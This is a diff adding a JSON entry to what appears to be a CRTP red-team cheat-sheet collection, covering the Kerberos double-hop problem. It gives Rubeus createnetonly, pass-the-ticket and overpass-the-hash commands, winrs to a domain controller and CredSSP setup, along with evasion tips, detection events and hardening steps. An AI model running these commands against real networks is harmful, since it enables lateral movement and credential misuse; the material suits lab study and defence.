@@ -1,0 +1,113 @@
+{
+  "id": "crtp-double-hop",
+  "name": "The Kerberos Double-Hop Problem & Fixes",
+  "command": "Rubeus.exe createnetonly /program:powershell.exe /show",
+  "description": "When you PSRemote/WinRS into host A, your credentials are NOT forwarded to a second hop (host B / the DC) - so tools run in that remote session fail to authenticate onward ('Access Denied' reaching the DC from A). This is the #1 CRTP exam gotcha. Fix it by giving the session an actual ticket (createnetonly + PTT / OverPass-the-Hash) instead of relying on delegation, or use CredSSP.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1550.003",
+    "T1021.006"
+  ],
+  "tools": [
+    "Rubeus",
+    "PowerShell"
+  ],
+  "tags": [
+    "double-hop",
+    "credssp",
+    "createnetonly",
+    "kerberos",
+    "lateral",
+    "exam-gotcha"
+  ],
+  "steps": [
+    {
+      "label": "Recognise it: from a remote session, DC access fails",
+      "command": "Invoke-Command -ComputerName <hostA> -ScriptBlock { Get-Domain }   # works local to A but Get-DomainUser against the DC -> Access Denied (no creds on 2nd hop)"
+    },
+    {
+      "label": "Fix (preferred): spawn a clean logon session",
+      "command": "Rubeus.exe createnetonly /program:powershell.exe /show"
+    },
+    {
+      "label": "Inject a TGT into that new session (no 2nd hop needed)",
+      "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /ptt   # or /aes256:<key> for opsec"
+    },
+    {
+      "label": "Now tools in that window reach the DC directly",
+      "command": "Get-DomainUser -Domain <domain>   # ticket is present in this logon session"
+    }
+  ],
+  "examples": [
+    {
+      "label": "OverPass-the-Hash to avoid the double hop entirely",
+      "command": "Rubeus.exe asktgt /user:svc_sql /aes256:<aes> /ptt ; winrs -r:dcorp-dc cmd /c set"
+    },
+    {
+      "label": "CredSSP (official fix, but sends plaintext creds to host A)",
+      "command": "Enter-PSSession -ComputerName dcorp-adminsrv -Authentication Credssp -Credential (Get-Credential)"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-overpass-hash",
+      "note": "Overpass-the-Hash gives the session a real ticket",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-psremoting",
+      "note": "The lateral-movement channel that triggers the double-hop",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump creds once you can reach the target",
+      "rel": "next"
+    }
+  ],
+  "notes": "WHY it happens: interactive PSRemoting authenticates you to host A with Kerberos, but host A has no way to prove your identity to host B unless delegation is configured - your TGT never lands on A. FIXES: (1) createnetonly spawns a process with a blank NEW logon session, then Rubeus asktgt /ptt injects a TGT into it - all onward auth uses that ticket, no delegation needed (cleanest for the exam). (2) OverPass-the-Hash / Pass-the-Ticket locally, then run tools from that shell. (3) CredSSP (Enable-WSManCredSSP -Role Client -DelegateComputer <A> on your box; -Role Server on A) - simplest but sends plaintext creds to A and is loud. (4) Unconstrained/constrained delegation if the account has it. Prefer AES (/aes256) over /rc4 for ticket ops.",
+  "references": [
+    {
+      "title": "CRTP - Lateral Movement / Double Hop",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "harmj0y - PowerShell Remoting & the Double Hop",
+      "url": "https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Kerberos does not forward a user's TGT to a service they authenticate to (by design). In a PowerShell Remoting session on host A, the logon is a network logon (type 3) with no delegatable credential, so any onward authentication from A to a third host (B/DC) has no ticket to present and fails. Attackers work around this by placing an actual usable ticket into a logon session: Rubeus createnetonly creates a sacrificial logon session (LOGON32_LOGON_NEW_CREDENTIALS) and asktgt /ptt injects a TGT into it, so onward Kerberos auth succeeds without any delegation being configured. CredSSP works instead by delegating the plaintext credential to host A.",
+    "prerequisites": "A foothold that requires reaching a second hop (remote PSSession/WinRS on host A, then targeting the DC or host B). For the createnetonly fix: the user's NT hash or AES key (from prior dumping). For CredSSP: ability to enable CredSSP client-side and the server allowing it.",
+    "impact": "T1550.003 Use Alternate Authentication Material: Pass the Ticket + T1021.006 WinRM. Enables full onward lateral movement (A -> DC) that would otherwise fail, so it is a key enabler of the whole CRTP kill chain rather than a standalone escalation.",
+    "detection": "Event 4624 Type 9 (NewCredentials logon) from createnetonly - an unusual logon type on a workstation is a strong signal. Rubeus createnetonly + asktgt leaves a TGT request (4768) with an RC4 or mismatched-from-context ticket. CredSSP: plaintext credential delegation and Event 4624 Type 3 followed by onward auth. MDI flags ticket anomalies (RC4 TGTs, tickets without prior AS-REQ).",
+    "artifacts": "Event 4624 Logon Type 9 (seclogo / NewCredentials) | Event 4768 TGT request from a process like powershell.exe shortly after a createnetonly-spawned process | CredSSP: WSMan CredSSP policy change (Enable-WSManCredSSP) in registry HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation",
+    "prevention": "Apply the tiering model so admins never authenticate to lower-tier hosts (removes the need for and risk of double-hop). Avoid enabling CredSSP (it exposes plaintext creds on the target). Use Protected Users group (blocks NTLM/RC4 and credential delegation for members). Monitor Logon Type 9 events. Deploy MDI for Kerberos anomaly detection.\nCredential Access Protection: keep privileged tickets/keys off lower-tier hosts.\nPrivileged Account Management: DAs log on only to Tier-0 systems.",
+    "evasion": "Use /aes256 instead of /rc4 for the injected TGT to avoid RC4-downgrade detections. Keep the sacrificial process short-lived. Prefer createnetonly+PTT over CredSSP (no plaintext credential hits the target).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1550/003/",
+      "https://attack.mitre.org/techniques/T1021/006/"
+    ],
+    "misconfiguration": "Unconstrained or overly-broad constrained delegation configured on service accounts (lets the double-hop succeed trivially and is separately abusable). CredSSP enabled domain-wide. Admins authenticating interactively to workstations.",
+    "vulnerable_config": "# CredSSP enabled on clients (allows plaintext credential delegation):\nGet-Item WSMan:\\localhost\\Client\\Auth\\CredSSP\n# Value True -> credentials delegated in plaintext to the remote host\n\n# Account is NOT in Protected Users, uses RC4, and has delegation -> double-hop trivially works",
+    "secure_config": "# Do not enable CredSSP unless required; if enabled, scope DelegateComputer tightly.\n# Add privileged accounts to Protected Users (blocks delegation + RC4):\nAdd-ADGroupMember -Identity 'Protected Users' -Members <admin>\n\n# Enforce tiering: deny DA interactive/remote logon to non-Tier-0:\n# GPO -> Deny log on through Remote Desktop / Deny access to this computer from the network for Tier-0 accounts on lower tiers\n\n# Alert on Logon Type 9:\n# EventID=4624 AND LogonType=9 AND LogonProcessName='seclogo' -> review"
+  },
+  "variations": [
+    {
+      "label": "CredSSP enablement (client side, one-time)",
+      "command": "Enable-WSManCredSSP -Role Client -DelegateComputer <hostA_fqdn> -Force"
+    },
+    {
+      "label": "Register a loopback PSSession config to re-auth (RunAsCredential)",
+      "command": "Register-PSSessionConfiguration -Name creddemo -RunAsCredential <domain>\\<user> -Force ; Enter-PSSession -ComputerName localhost -ConfigurationName creddemo"
+    }
+  ]
+}
